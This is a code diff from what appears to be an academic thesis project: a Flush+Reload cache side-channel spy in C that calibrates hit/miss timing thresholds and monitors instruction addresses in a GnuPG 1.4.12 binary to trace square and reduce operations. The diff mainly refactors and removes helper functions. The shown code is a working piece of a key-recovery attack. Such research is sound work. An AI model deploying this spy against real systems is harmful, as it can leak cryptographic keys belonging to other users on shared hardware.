@@ -1,26 +1,8 @@
-
 #define _GNU_SOURCE
-#include <string.h>
-#include <sys/mman.h>
-#include <sys/stat.h>
-#include <limits.h>
-#include <fcntl.h> //open
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h> //close
-#include <sched.h>
-#include <pthread.h>
 #include "spy.h"
 #include "../../Utils/src/assemblyinstructions.h"
 #include "../../Utils/src/cachetechniques.h"
 #include "../../Utils/src/fileutils.h"
-
-#define handle_error(msg) \
-	do { perror(msg); exit(EXIT_FAILURE); } while (0)
-
-#define EXE_FILENAME "/home/root/gnupg-1.4.12/bin/gpg"
-
-#define EXE_ADDRS_FILENAME "/home/root/thesis-code/exe_addresses.txt"
 
 #define ANALYSIS_CSV_FILENAME "/home/root/thesis-code/static_analysis.csv"
 
@@ -37,7 +19,7 @@
 unsigned long obtainthreshold(int histogramsize, int histogramscale) {
 	const int MAX_RUNS = 4 * 1024 * 1024;
 	const int PAGES_SIZE = 4096;
-	const int MID_ARRAY = PAGES_SIZE/2;
+	const int MID_ARRAY = PAGES_SIZE / 2;
 	void *array;
 	unsigned int *hit_counts;
 	hit_counts = calloc(histogramsize, sizeof(unsigned int));
@@ -46,7 +28,7 @@ unsigned long obtainthreshold(int histogramsize, int histogramscale) {
 
 	int i;
 	array = mmap(0, PAGES_SIZE, PROT_READ | PROT_WRITE,
-				MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 	reload(array + MID_ARRAY);
 	sched_yield();
 	//4MB
@@ -69,7 +51,8 @@ unsigned long obtainthreshold(int histogramsize, int histogramscale) {
 	unsigned int missminindex = 0;
 	printf("TSC:           HITS           MISSES\n");
 	for (i = 0; i < histogramsize; ++i) {
-		printf("%3d: %10zu %10zu\n", i * histogramscale, hit_counts[i], miss_counts[i]);
+		printf("%3d: %10zu %10zu\n", i * histogramscale, hit_counts[i],
+				miss_counts[i]);
 		if (hitmax < hit_counts[i]) {
 			hitmax = hit_counts[i];
 			hitmaxindex = i;
@@ -86,8 +69,7 @@ unsigned long obtainthreshold(int histogramsize, int histogramscale) {
 	int maxhit = 0, maxmiss = 0, threshold = 0;
 	maxhit = hitmaxindex * histogramscale;
 	maxmiss = missmaxindex * histogramscale;
-	threshold = maxmiss
-			- (maxmiss - maxhit) / 2;
+	threshold = maxmiss - (maxmiss - maxhit) / 2;
 
 	for (i = 0; i < histogramsize; ++i) {
 		if (miss_counts[i] > 0 && (i * histogramscale) > threshold) {
@@ -116,85 +98,6 @@ unsigned long obtainthreshold(int histogramsize, int histogramscale) {
 	return threshold;
 }
 
-long int getaddrstomonitor(const char* exeaddrsfilename, long int* out_addrs) {
-	FILE* ptr_addrs = fopen(exeaddrsfilename, "r");
-	if (ptr_addrs == NULL)
-		handle_error("fopen_exeaddrsfilename");
-	unsigned int linesize = 0, linelength = 0;
-	char* line = malloc(256 * sizeof(char*));
-	char* pEnd;
-	long int nr_addrs = 0;
-	int i;
-
-	if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
-		handle_error("getline_nr_addrs <= 0");
-	line[linelength - 1] = '\0';
-	nr_addrs = strtol(line, &pEnd, 10);
-	if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
-		handle_error("strtol_nr_addrs != \\r or \\n or \\0");
-
-	long int addraux;
-
-	for (i = 0; i < nr_addrs; ++i) {
-		if ((linelength = getline(&line, &linesize, ptr_addrs)) <= 0)
-			handle_error("getline_addrs <= 0");
-		addraux = strtol(line, &pEnd, 0);
-		if (*pEnd != '\r' && *pEnd != '\n' && *pEnd != '\0')
-			handle_error("strtol_addrs != \\r or \\n or \\0");
-		out_addrs[i] = addraux;
-	}
-	free(line);
-	fclose(ptr_addrs);
-	return nr_addrs;
-}
-
-int setcoreaffinity(int core_id) {
-	int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
-	if (core_id < 0 || core_id >= num_cores)
-		handle_error("Wrong core id");
-	cpu_set_t cpuset;
-	CPU_ZERO(&cpuset);
-	CPU_SET(core_id, &cpuset);
-	return sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);
-}
-
-void delayloop(size_t cycles) {
-	unsigned long long start = rdtscp();
-	while ((rdtscp() - start) < cycles)
-		;
-}
-
-int isvictimactive(unsigned int *analysis, int nr_addrs, int threshold) {
-	int i;
-	for (i = 0; i < nr_addrs; ++i) {
-		if (analysis[i] < threshold)
-			return 1;
-	}
-	return 0;
-}
-
-int missedvictimactivity(unsigned long long startcycles) {
-	if (getcurrenttsc() > startcycles)
-		return 1;
-	while (getcurrenttsc() < startcycles)
-		;
-	return 0;
-}
-
-void analysealladdrs(unsigned int *out_analysis, unsigned long ptr_offset,
-		long int *exe_addrs, int nr_addrs, int threshold) {
-	int addrs_index;
-	for (addrs_index = 0; addrs_index < nr_addrs; ++addrs_index) {
-		char * aux = (char*) exe_addrs[addrs_index];
-		char * ptr_to_monitor = aux + ptr_offset;
-		unsigned int auxtsc = reloadandflush(ptr_to_monitor);
-		if (OUTPUTRAWDATA)
-			out_analysis[addrs_index] = auxtsc < UINT_MAX ? auxtsc : UINT_MAX;
-		else
-			out_analysis[addrs_index] = auxtsc < threshold ? 1 : 2;
-	}
-}
-
 void missedalladdrs(unsigned int *out_analysis, unsigned long ptr_offset,
 		long int *exe_addrs, int nr_addrs) {
 	int addrs_index;
@@ -202,7 +105,6 @@ void missedalladdrs(unsigned int *out_analysis, unsigned long ptr_offset,
 		out_analysis[addrs_index] = 0;
 	}
 }
-
 
 //0-square
 //1-reduce
@@ -282,14 +184,16 @@ int analysecache(int delay, long int exe_addrs[MAX_ADDRS_TO_MONITOR],
 
 	//Begin NEW
 	unsigned long long start = getcurrenttsc();
-	analysealladdrs(analysis_array[0], ptr_offset, exe_addrs, nr_addrs,
-	THRESHOLD);
+	fr_analysealladdrs(OUTPUTRAWDATA, analysis_array[0], ptr_offset, exe_addrs,
+			nr_addrs,
+			THRESHOLD);
 	do {
 		do {
 			start += delay;
 		} while (missedvictimactivity(start));
-		analysealladdrs(analysis_array[0], ptr_offset, exe_addrs, nr_addrs,
-		THRESHOLD);
+		fr_analysealladdrs(OUTPUTRAWDATA, analysis_array[0], ptr_offset, exe_addrs,
+				nr_addrs,
+				THRESHOLD);
 	} while (!isvictimactive(analysis_array[0], nr_addrs,
 	OUTPUTRAWDATA ? THRESHOLD : 2));
 
@@ -299,8 +203,9 @@ int analysecache(int delay, long int exe_addrs[MAX_ADDRS_TO_MONITOR],
 			idle < MAXIDLECOUNT && i < MAX_TIMES_TO_MONITOR_EACH_ADDRS;
 			++idle, ++i) {
 		if (!missedactivity) {
-			analysealladdrs(analysis_array[i], ptr_offset, exe_addrs, nr_addrs,
-			THRESHOLD);
+			fr_analysealladdrs(OUTPUTRAWDATA, analysis_array[i], ptr_offset,
+					exe_addrs, nr_addrs,
+					THRESHOLD);
 			if (isvictimactive(analysis_array[i], nr_addrs,
 			OUTPUTRAWDATA ? THRESHOLD : 2))
 				idle = 0;
@@ -337,19 +242,20 @@ void autoobtaindelay() {
 
 		//analyse LLC
 		printf("Analyse Cache delay: %d\n\n", delay);
-		int analysis_array_length = analysecache(delay, exe_addrs,
-				nr_addrs, analysis_array);
+		int analysis_array_length = analysecache(delay, exe_addrs, nr_addrs,
+				analysis_array);
 
-		obtaindparameternumberofbits(THRESHOLD, analysis_array_length,
-				nr_addrs, analysis_array, delay_array[i]);
+		obtaindparameternumberofbits(THRESHOLD, analysis_array_length, nr_addrs,
+				analysis_array, delay_array[i]);
 		++i;
 	}
-	biarraytocsvwheaders(ANALYSIS_CSV_FILENAME, exe_addrs,i, nr_addrs, delay_array);
+	biarraytocsvwheaders(ANALYSIS_CSV_FILENAME, exe_addrs, i, nr_addrs,
+			delay_array);
 
 }
 
 int main() {
-	const unsigned long long threshold = obtainthreshold(300,5);
+	const unsigned long threshold = obtainthreshold(300, 5);
 	printf("THRESHOLD ::: %llu\n\r", threshold);
 //	const unsigned long long THRESHOLD = 45;
 
